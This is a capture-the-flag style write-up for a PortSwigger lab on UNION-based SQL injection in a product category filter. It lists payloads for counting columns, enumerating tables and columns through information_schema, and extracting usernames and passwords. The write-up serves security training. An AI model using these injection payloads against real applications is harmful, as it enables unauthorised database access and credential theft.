# Lab: SQL injection attack, listing the database contents on non-Oracle databases

**Lab Link:** [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle]

## Explanation

This lab contains a SQL injection vulnerability in the product category filter. The objective is to use SQL injection to **enumerate the database contents**, including the **users table and their credentials**.

The target uses a **non-Oracle database** (e.g., MySQL, Microsoft SQL Server, or PostgreSQL). These support the `information_schema` database for metadata queries.

---

## Step-by-step Solution

### 🔹 Step 1: Intercept the request

Click on any product category and intercept the request using Burp Suite. Then send it to **Repeater**.

Example:
```http
GET /filter?category=Gifts HTTP/1.1
🔹 Step 2: Determine number of columns
Send this payload:

sql
Sao chép mã
'+UNION+SELECT+NULL,NULL-- 
If successful → 2 columns.

Otherwise, test other numbers (e.g., 3 columns).

🔹 Step 3: Identify column that reflects on page
Try:

sql
Sao chép mã
'+UNION+SELECT+'abc','def'-- 
If "abc" or "def" shows on the page, that column is suitable for displaying data.

🔹 Step 4: List all tables in the database
Use this query:
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
Look for a table named users or similar.

🔹 Step 5: List column names in the users table
Use this payload:


'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--
You may need to lowercase or uppercase 'users' depending on DBMS.

🔹 Step 6: Retrieve usernames and passwords
Use the actual column names found:


'+UNION+SELECT+username,password+FROM+users--
If only one column displays, you can combine values:

'+UNION+SELECT+CONCAT(username,':',password),NULL+FROM+users--  -- (for MySQL)